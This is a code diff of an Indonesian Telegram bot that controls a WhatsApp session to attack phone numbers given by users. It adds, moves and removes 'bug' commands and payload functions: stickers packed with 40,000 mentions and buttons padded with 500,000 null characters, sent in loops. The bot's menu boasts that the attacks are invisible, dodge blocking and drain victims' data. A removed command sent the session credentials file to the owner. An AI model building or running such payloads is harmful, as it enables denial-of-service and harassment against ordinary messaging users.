@@ -564,23 +564,7 @@ const startSesi = async () => {
 
 // Command untuk pairing WhatsApp
 // Command handler untuk addpairing
-bot.command("getfile", async (ctx) => {
-  if (!OWNER_ID(ctx.from.id)) {
-    return await ctx.reply(
-      "❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini."
-    );
-  }
-
-  const filePath = "./session/creds.json";
-  try {
-    await ctx.replyWithDocument({ source: filePath });
-    console.log(`File ${filePath} berhasil dikirim.`);
-  } catch (error) {
-    console.error("Kosong njir:", error);
-    ctx.reply("User Belom Sambungin Device Jir😜.");
-  }
-});
-bot.command("addbot", async (ctx) => {
+bot.command("connect", async (ctx) => {
   if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
       return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
   }
@@ -904,6 +888,41 @@ bot.command("addadmin", async (ctx) => {
       console.error('Error adding admin:', error);
       await ctx.reply("❌ Gagal menambahkan admin. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
   }
+});
+bot.command('grouponly', (ctx) => {
+  const userId = ctx.from.id.toString();
+
+  if (userId !== OWNER_ID && !isAdmin(userId)) {
+    return ctx.reply('❌ You are not authorized to use this command.');
+  }
+
+  botForGroup = true;
+  botForPrivateChat = false;
+  ctx.reply(`
+╭──(  ✅ Success    ) 
+│ Bot diatur untuk hanya merespon di Grup!
+╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
+});
+const checkChatType = (ctx, next) => {
+  if (botForGroup && ctx.chat.type !== 'group' && ctx.chat.type !== 'supergroup') {
+    ctx.reply('❌ Command ini hanya dapat digunakan di grup.');
+    return;
+  }
+
+  if (botForPrivateChat && ctx.chat.type !== 'private') {
+    ctx.reply('❌ Command ini hanya dapat digunakan di private chat.');
+    return;
+  }
+
+  next(); // Melanjutkan ke handler berikutnya jika lolos pengecekan
+};
+bot.use((ctx, next) => {
+  // Set variabel global untuk menentukan tipe bot
+  botForGroup = true; // Hanya untuk grup
+  botForPrivateChat = false; // Tidak untuk private chat
+
+  // Gunakan middleware
+  checkChatType(ctx, next);
 });
 
 // Delete Premium Command
@@ -1333,101 +1352,7 @@ bot.command("system", checkWhatsAppConnection, checkPremium, async ctx => {
   await donerespone(target, ctx);
 });
 
-bot.command("delaymention", checkWhatsAppConnection, checkPremium, async ctx => {
-  const q = ctx.message.text.split(" ")[1];
-
-  if (!q) {
-      return await ctx.reply(`Example: commandnya 62×××`);
-  }
-
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-
-  await prosesrespone(target, ctx);
-
-  for (let i = 0; i < 3; i++) {
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await protocolbug2(target, true)
-        await protocolbug3(target, true)
-        await InvisClrs(target, true)
-        await InVisibleX1(target, true)
-        await sleep(4000)
-    
-}
-
-  await donerespone(target, ctx);
-});
-
-bot.command("fz", checkWhatsAppConnection, checkPremium, async ctx => {
-  const q = ctx.message.text.split(" ")[1];
-
-  if (!q) {
-      return await ctx.reply(`Example: commandnya 62×××`);
-  }
-
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-
-  await prosesrespone(target, ctx);
-
-  for (let i = 0; i < 200; i++) {
-        await bulldozer(target, true);
-    
-}
-
-  await donerespone(target, ctx);
-});
-
-bot.command("pro", checkWhatsAppConnection, checkPremium, async ctx => {
+bot.command("bull2", checkWhatsAppConnection, checkPremium, async ctx => {
   const q = ctx.message.text.split(" ")[1];
 
   if (!q) {
@@ -1439,7 +1364,47 @@ bot.command("pro", checkWhatsAppConnection, checkPremium, async ctx => {
   await prosesrespone(target, ctx);
 
   for (let i = 0; i < 500; i++) {
-    await bulldozer(target, true)
+        await bulldozer(target)
+        await sleep(3000)
+    
+}
+
+  await donerespone(target, ctx);
+});
+
+bot.command("ranzbull", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+
+  if (!q) {
+      return await ctx.reply(`Example: commandnya 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  await prosesrespone(target, ctx);
+
+  for (let i = 0; i < 100; i++) {
+        await bulldozer(target)
+        await sleep(3000)
+    
+}
+
+  await donerespone(target, ctx);
+});
+
+bot.command("forcestajhhbbtus", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+
+  if (!q) {
+      return await ctx.reply(`Example: commandnya 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  await prosesrespone(target, ctx);
+
+  for (let i = 0; i < 10; i++) {
+    await protocolbug3(target, true)
     await sleep(3000)
     
 }
@@ -1625,9 +1590,9 @@ bot.action('bug_menu', async (ctx) => {
             
  𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘓 𝘌 𝘊 𝘛 𝘐 𝘖 𝘕
 ──────────────────────────
-#- RanzDelayMention
-▢ /delaymention 628xxx
-╰➤ Bug ini akan mengakibatkan target delay dan tidak bisa mengirim chat dengan leluasa, keuntungan bug ini invisible ( tidak terlihat di hp target ) jadi bebas bug sepuasnya tanpa takut ketahuan atau diblokir
+#- RanzBulldozer 
+▢ /bull 628xxx
+╰➤ Bug ini akan mengakibatkan target delay dan tidak bisa mengirim chat dengan leluasa, keuntungan bug ini invisible ( tidak terlihat di hp target ) jadi bebas bug sepuasnya tanpa takut ketahuan atau diblokir dan akan menguras kuota target 
 
 #- RanzBugForceClose
 ▢ /forceclose 628xxx
@@ -1771,82 +1736,6 @@ async function aswFChyui(target) {
   await kipop.relayMessage(target, msg.message, {
     messageId: msg.key.id,
     participant: { jid: target },
-  });
-}
-async function bulldozer(isTarget) {
-  let message = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
-          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
-          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
-          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
-          mimetype: "image/webp",
-          directPath:
-            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
-          fileLength: { low: 1, high: 0, unsigned: true },
-          mediaKeyTimestamp: {
-            low: 1746112211,
-            high: 0,
-            unsigned: false,
-          },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: true,
-          contextInfo: {
-            mentionedJid: [
-              "0@s.whatsapp.net",
-              ...Array.from(
-                {
-                  length: 40000,
-                },
-                () =>
-                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
-              ),
-            ],
-            groupMentions: [],
-            entryPointConversionSource: "non_contact",
-            entryPointConversionApp: "whatsapp",
-            entryPointConversionDelaySeconds: 467593,
-          },
-          stickerSentTs: {
-            low: -1939477883,
-            high: 406,
-            unsigned: false,
-          },
-          isAvatar: false,
-          isAiSticker: false,
-          isLottie: false,
-        },
-      },
-    },
-  };
-
-  const msg = generateWAMessageFromContent(isTarget, message, {});
-
-  await kipop.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [isTarget],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: isTarget },
-                content: undefined,
-              },
-            ],
-          },
-        ],
-      },
-    ],
   });
 }
 async function spamNotif(target, Ptcp = true) {
@@ -2116,6 +2005,82 @@ target,
 }
 );
 }
+async function bulldozer(isTarget) {
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+          mimetype: "image/webp",
+          directPath:
+            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+          fileLength: { low: 1, high: 0, unsigned: true },
+          mediaKeyTimestamp: {
+            low: 1746112211,
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                {
+                  length: 40000,
+                },
+                () =>
+                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: -1939477883,
+            high: 406,
+            unsigned: false,
+          },
+          isAvatar: false,
+          isAiSticker: false,
+          isLottie: false,
+        },
+      },
+    },
+  };
+
+  const msg = generateWAMessageFromContent(isTarget, message, {});
+
+  await kipop.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [isTarget],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: isTarget },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+}
 async function protocolbug2(isTarget, mention) {
     const generateMessage = {
         viewOnceMessage: {
@@ -2199,78 +2164,6 @@ async function protocolbug2(isTarget, mention) {
         );
     }
 }
-async function InvisClrs(target, show) {
-            let msg = await generateWAMessageFromContent(target, {
-                buttonsMessage: {
-                    text: "🩸",
-                    contentText:
-                        "🩸 эмне үчүн эмесXylaysX",
-                    footerText: "🩸 эмне үчүн эмесXylaysX",
-                    buttons: [
-                        {
-                            buttonId: ".aboutb",
-                            buttonText: {
-                                displayText: "🩸 эмне үчүн эмесXylaysX" + "\u0000".repeat(500000),
-                            },
-                            type: 1,
-
-},
-                    ],
-                    headerType: 1,
-                },
-            }, {});
-        
-            await kipop.relayMessage("status@broadcast", msg.message, {
-                messageId: msg.key.id,
-                statusJidList: [target],
-                additionalNodes: [
-                    {
-                        tag: "meta",
-                        attrs: {},
-                        content: [
-                            {
-                                tag: "mentioned_users",
-                                attrs: {},
-                                content: [
-                                    {
-                                        tag: "to",
-                                        attrs: { jid: target },
-                                        content: undefined,
-                                    },
-                                ],
-                            },
-                        ],
-                    },
-                ],
-            });
-        
-            if (show) {
-                await kipop.relayMessage(
-                    target,
-                    {
-                        groupStatusMentionMessage: {
-                            message: {
-                                protocolMessage: {
-                                    key: msg.key,
-                                    type: 25,
-                                },
-                            },
-                        },
-                    },
-                    {
-                        additionalNodes: [
-                            {
-                                tag: "meta",
-                                attrs: {
-                                    is_status_mention: "Fuck you",
-                                },
-                                content: undefined,
-                            },
-                        ],
-                    }
-                );
-            }            
-        }
 
 async function InVisibleX1(target, show) {
             let msg = await generateWAMessageFromContent(target, {
@@ -2292,7 +2185,7 @@ async function InVisibleX1(target, show) {
                 },
             }, {});
         
-            await kipop.relayMessage("status@broadcast", msg.message, {
+            await kipip.relayMessage("status@broadcast", msg.message, {
                 messageId: msg.key.id,
                 statusJidList: [target],
                 additionalNodes: [
@@ -2317,7 +2210,7 @@ async function InVisibleX1(target, show) {
             });
         
             if (show) {
-                await kipop.relayMessage(
+                await kipip.relayMessage(
                     target,
                     {
                         groupStatusMentionMessage: {
